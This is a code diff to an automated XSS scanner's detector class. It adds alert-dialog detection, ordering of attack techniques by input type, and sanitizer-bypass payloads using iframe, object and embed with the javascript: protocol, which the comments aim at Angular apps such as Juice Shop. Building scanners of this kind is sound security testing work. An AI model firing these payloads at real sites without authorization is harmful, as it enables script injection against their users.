@@ -118,6 +118,8 @@ export class XssDetector implements IActiveDetector {
   private stats: XssDetectorStats;
   private config: ResolvedXssDetectorConfig;
   private testedPayloads: Map<string, Set<string>> = new Map();
+  private dialogTriggered: boolean = false;
+  private dialogMessage: string = '';
 
   constructor(config: XssDetectorConfig = {}) {
     this.injector = new PayloadInjector();
@@ -207,9 +209,16 @@ export class XssDetector implements IActiveDetector {
 
   /**
    * Verifies XSS execution by checking for the injected proof variable
+   * or detecting JavaScript dialogs (alert/confirm/prompt)
    * Implements DOM Mutation Wait to handle SPAs
    */
   private async verifyExecution(page: Page): Promise<boolean> {
+    // Check if a dialog was triggered by our payload
+    if (this.dialogTriggered) {
+      this.logger.debug(`[XSS] Dialog detected with message: ${this.dialogMessage}`);
+      return true;
+    }
+
     try {
       // DOM Mutation Wait: Wait for the payload to be rendered and executed
       // We wait for the window property to be set
@@ -226,8 +235,33 @@ export class XssDetector implements IActiveDetector {
 
       return proof === PROOF_VALUE;
     } catch (e) {
-      return false;
+      // Final check for dialog
+      return this.dialogTriggered;
     }
+  }
+
+  /**
+   * Sets up dialog listener on the page to detect XSS via alert/confirm/prompt
+   */
+  private setupDialogListener(page: Page): void {
+    this.dialogTriggered = false;
+    this.dialogMessage = '';
+    
+    page.on('dialog', async (dialog) => {
+      this.dialogTriggered = true;
+      this.dialogMessage = dialog.message();
+      this.logger.debug(`[XSS] Dialog triggered: ${dialog.type()} - ${dialog.message()}`);
+      // Auto-dismiss the dialog to prevent blocking
+      await dialog.dismiss().catch(() => {});
+    });
+  }
+
+  /**
+   * Resets dialog tracking state
+   */
+  private resetDialogState(): void {
+    this.dialogTriggered = false;
+    this.dialogMessage = '';
   }
 
   /**
@@ -241,6 +275,9 @@ export class XssDetector implements IActiveDetector {
 
     this.stats = this.initStats();
     this.testedPayloads.clear();
+
+    // Set up dialog listener to detect XSS via alert/confirm/prompt
+    this.setupDialogListener(page);
 
     const xssTargets = attackSurfaces.filter(
       (surface) =>
@@ -376,9 +413,30 @@ export class XssDetector implements IActiveDetector {
     return score;
   }
 
+  /**
+   * Get technique order based on surface type and input characteristics
+   * Enhanced: Now filters techniques based on input type for efficiency
+   */
   private getTechniqueOrder(surface: AttackSurface): XssType[] {
     const order: XssType[] = [];
+    const inputType = (surface.metadata?.inputType as string) || 'text';
 
+    // For hidden fields, skip DOM-based (not visible) and stored (rarely applies)
+    if (inputType === 'hidden') {
+      return [XssType.REFLECTED, XssType.JSON_XSS];
+    }
+
+    // For checkbox/radio, very limited XSS surface
+    if (inputType === 'checkbox' || inputType === 'radio') {
+      return [XssType.REFLECTED];
+    }
+
+    // For number/date inputs, XSS is rare but reflected is possible
+    if (inputType === 'number' || inputType === 'date' || inputType === 'datetime-local') {
+      return [XssType.REFLECTED];
+    }
+
+    // API and JSON surfaces - prioritize JSON XSS
     if (
       surface.type === AttackSurfaceType.API_PARAM ||
       surface.type === AttackSurfaceType.JSON_BODY
@@ -386,6 +444,7 @@ export class XssDetector implements IActiveDetector {
       order.push(XssType.JSON_XSS, XssType.ANGULAR_TEMPLATE, XssType.DOM_BASED);
     }
 
+    // URL parameters and links - reflected and DOM-based
     if (
       surface.type === AttackSurfaceType.URL_PARAMETER ||
       surface.type === AttackSurfaceType.LINK
@@ -393,10 +452,12 @@ export class XssDetector implements IActiveDetector {
       order.push(XssType.REFLECTED, XssType.DOM_BASED);
     }
 
+    // Form inputs - full technique set for text inputs
     if (surface.type === AttackSurfaceType.FORM_INPUT) {
       order.push(XssType.REFLECTED, XssType.ANGULAR_TEMPLATE, XssType.STORED, XssType.DOM_BASED);
     }
 
+    // Ensure all techniques are included (in priority order)
     const allTechniques = [
       XssType.REFLECTED,
       XssType.ANGULAR_TEMPLATE,
@@ -518,6 +579,17 @@ export class XssDetector implements IActiveDetector {
       `<svg onload=${proofPayload}>`,
     ];
 
+    // Angular/SPA-specific payloads that bypass sanitizers using iframe javascript: protocol
+    // These work on Juice Shop and similar Angular apps that use innerHTML with bypassSecurityTrust
+    const iframeBypasses = [
+      `<iframe src="javascript:${proofPayload}">`,
+      `<iframe src="javascript:alert(\`xss\`)">`,
+      `<iframe src="javascript:alert('XSS')">`,
+      `<iframe srcdoc="<script>${proofPayload}</script>">`,
+      `<object data="javascript:${proofPayload}">`,
+      `<embed src="javascript:${proofPayload}">`,
+    ];
+
     const attributeBreakout = [
       `" autofocus onfocus=${proofPayload} "`,
       `' autofocus onfocus=${proofPayload} '`,
@@ -548,24 +620,28 @@ export class XssDetector implements IActiveDetector {
       reflectionContext === 'javascript' || surface.context === InjectionContext.JAVASCRIPT;
 
     if (preferAttribute) {
-      basePayloads.push(...attributeBreakout, ...fastHtml);
+      basePayloads.push(...attributeBreakout, ...fastHtml, ...iframeBypasses);
     } else if (preferJs) {
-      basePayloads.push(...jsContext, ...fastHtml);
+      basePayloads.push(...jsContext, ...fastHtml, ...iframeBypasses);
     } else if (preferUrl) {
-      basePayloads.push(...urlContext, ...fastHtml);
+      basePayloads.push(...urlContext, ...fastHtml, ...iframeBypasses);
     } else if (reflectionContext === 'html-body') {
-      basePayloads.push(...fastHtml, ...attributeBreakout, ...jsContext, ...urlContext);
+      basePayloads.push(...fastHtml, ...iframeBypasses, ...attributeBreakout, ...jsContext, ...urlContext);
     } else {
-      basePayloads.push(...fastHtml, ...attributeBreakout, ...jsContext, ...urlContext);
+      // Default: include iframe bypasses early for SPA/Angular apps
+      basePayloads.push(...fastHtml, ...iframeBypasses, ...attributeBreakout, ...jsContext, ...urlContext);
     }
 
     if (['search', 'query', 'comment', 'message'].some((key) => nameLower.includes(key))) {
+      // For search/query inputs, also prioritize iframe bypasses (effective against SPAs like Juice Shop)
       basePayloads.unshift(`<img src=x onerror=${proofPayload}>`);
+      basePayloads.unshift(`<iframe src="javascript:alert(\`xss\`)">`);
     }
 
     if (this.config.permissiveMode) {
-      // Prioritize simple, bWAPP-effective payloads
+      // Prioritize simple, bWAPP-effective payloads and iframe bypasses for Angular apps
       basePayloads.unshift(
+        `<iframe src="javascript:alert(\`xss\`)">`,
         `<script>${proofPayload}</script>`,
         `<img src=x onerror=${proofPayload}>`
       );
@@ -666,12 +742,18 @@ export class XssDetector implements IActiveDetector {
     for (const payload of payloads) {
       if (this.hasTestedPayload(surface, payload)) continue;
 
+      // Reset dialog state before each payload test
+      this.resetDialogState();
+
       try {
         const result = await this.injector.inject(page, surface, payload, {
           encoding: PayloadEncoding.NONE,
           submit: true,
           baseUrl,
         });
+
+        // Small wait for dialog to trigger (especially for iframe javascript: payloads)
+        await page.waitForTimeout(100).catch(() => {});
 
         const reflectionAnalysis = this.analyzeReflection(result, payload);
 
